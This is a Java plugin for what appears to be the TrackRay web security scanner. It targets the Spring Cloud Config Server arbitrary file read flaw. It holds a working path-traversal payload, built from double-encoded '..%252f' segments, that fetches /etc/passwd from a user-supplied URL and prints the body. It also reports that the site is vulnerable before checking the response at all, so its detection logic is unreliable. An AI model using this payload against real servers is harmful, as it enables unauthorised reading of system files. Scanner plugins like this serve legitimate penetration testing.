package com.trackray.module.plugin.webapp.spring;

import com.trackray.base.annotation.Plugin;
import com.trackray.base.annotation.Rule;
import com.trackray.base.plugin.WebSocketPlugin;
import com.trackray.base.utils.Message;
import org.javaweb.core.net.HttpResponse;

import java.net.MalformedURLException;
import java.util.Map;

/**
 * @author 浅蓝
 * @email blue@ixsec.org
 * @since 2019/4/21 13:32
 */
@Plugin(title = "SpringCloud Server Config 任意文件读取漏洞" , author = "浅蓝" , value = "springcloud01" )
@Rule(websocket = true )
public class SpringCloudServerConfigFileRead extends WebSocketPlugin {

    public static String payload = "/test/pathtraversal/master/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..";
    @Override
    public boolean check(Map param) {
        send("[!] 请等待，正在检测...");
        send("请输入url");
        String input = getInput();
        HttpResponse httpResponse = null;
        try {
            httpResponse = requests.url(input + payload.concat("/etc/passwd"))
                    .get();
        } catch (MalformedURLException e) {
            e.printStackTrace();
        }

        String body = httpResponse.body();

        sendColorMsg(Message.RED("[!] 该网站存在安全漏洞!!!"));

        sendColorMsg(Message.WHITE(body));

        return true;
    }

    @Override
    public Object start() {
        try {
            Thread.sleep(1000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        return "";
    }
}
